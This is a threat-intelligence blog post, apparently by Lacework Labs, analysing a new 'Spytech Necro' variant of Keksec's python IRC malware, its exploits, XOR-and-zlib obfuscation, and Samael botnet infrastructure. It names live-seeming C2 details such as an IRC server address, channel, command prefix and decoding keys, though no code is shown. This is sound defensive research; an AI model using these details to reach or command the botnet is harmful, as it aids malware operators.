Key Takeaways
Keksec (aka Freakout) continues to develop Necro ‚Äì their polymorphic python-based IRC malware
The newest version dubbed ‚ÄúSpytech Necro‚Äù includes significant updates to the C2 protocol and additional exploits
including the recent Confluence exploit described in CVE-2021-26084
Keksec is distributing additional Tsunami malware via their ‚ÄúSamael‚Äù botnet infrastructure
Analysis tools and indicators are available here
Beginning in mid-September new Necro variants started appearing on VirusTotal. Analysis of these specimens revealed
configurations including previously unobserved exploits and capabilities. While activity in the wild appears limited at this
time, this does indicate continued development of the Necro python malware. These new specimens coincided with
infrastructure staging belonging to the Keksec‚Äôs ‚ÄúSamael‚Äù botnet. Additionally, infrastructure leveraged by Keksec is
likewise being leveraged by other actors including those responsible for the SBIDIOT botnet and known IoT attacker
DaddyL33t.
Spytech Necro
In a deviation from previous Necro versions, ‚ÄúSpytech Necro‚Äù uses a plaintext XOR key of
\x65hhhhFuckSpyTechUsersWeDaMilitiaAnonym00se , as opposed to an integer array. This is used in combination zlib
compression to obfuscate important strings in the malware. These new versions can be decoded with a script provided by
Lacework Labs. Other key updates include exploits for:
CVE-2014-6271 ‚Äì Shellshock
Drupal RCE (< 8.6.10 / < 8.5.11 ‚Äì REST Module Remote Code Execution)
CVE-2021-26084 ‚Äì Confluence Server Webwork OGNL injection
Jenkins RCE (CVE-2019-1003029, CVE-2019-1003030
The most significant modification in Spytech Necro involves the C2 protocol, specifically with a C2 check-in and fetching
of configurations. A new DGA schema that leveraged NoIP free domains was also observed however this functionality is
frequently updated among various Necro versions. Similar to the Necro obfuscation itself, the C2 protocol also uses a
multibyte XOR in combination with Zlib, albeit with a separate key ‚Äì n3cr0t0r_freakout. Following the check-in, the C2
returns the following data:
Channel name
Channel password‚Äô
SHA512 password hash for bot authentication
Command prefix
IRC host
At the time of this blog, the configured IRC host is 66.29.149.202 (Namecheap) and the channel is #dankmemez. The
following python is a de-obfuscated and commented version of the Necro C2 component and will return the current
configuration (assuming the infrastructure is online):

The command prefix returned by the C2 was configured as a period at the time of this blog. This is an
interesting feature as it adds an additional layer of operational security. This means even if someone has most
of the C2 configurations, they would not be able to issue commands to the Necro bots without the correct prefix.

Keksec infrastructure is characterized by its various botnets. While several are currently active, the most recent of these
appears to be the ‚ÄúSamael‚Äù component. Samael has been active since at least late June 2021.

Malware download from Samael hosts is similar to the Tsunami-Ryuk malware reported by Lacework Labs in July 2021.
The distinguishing feature being the log file written to the victim machine. In this case the log file is plaintext with the
message: This device has been infected by urmommy
. The ‚ÄòUrmommy‚Äô handle was also seen in a screenshot from the
hellabooters Instagram, also reported in the Tsunami-Ryuk blog. (Figure 2)

Examination of Samael infrastructure revealed overlaps with other botnets, including those belonging to Keksec, as well
as those with no known Keksec association such as the SBIDIOT botnet. SBIDIOT is a prolific IoT botnet that was first
reported in April 2021 by Nozomi Networks. Another overlap of note was between Keksec and known IoT actor
‚ÄúDaddyL33t.‚Äù This link is also reflected in the Instagram where the Keksec profile ur0a_ has links to the alleged Instagram
profile for DaddyL33t (1m4osec). The following table lists known Samael hosts, most of which are either hosted at
Colocrossing or Nexeon:

Spytech Necro appears to have limited distribution at this time and there are no indications of widespread deployment.
This presumption is based on the absence of Necro scanning artifacts in Lacework Labs honeypots, as well as no
observed check-ins to the Spytech Necro IRC server. The malware‚Äôs new abilities allow for dynamic bot updates and
better resiliency so this new functionality will likely make its way into follow-on versions.
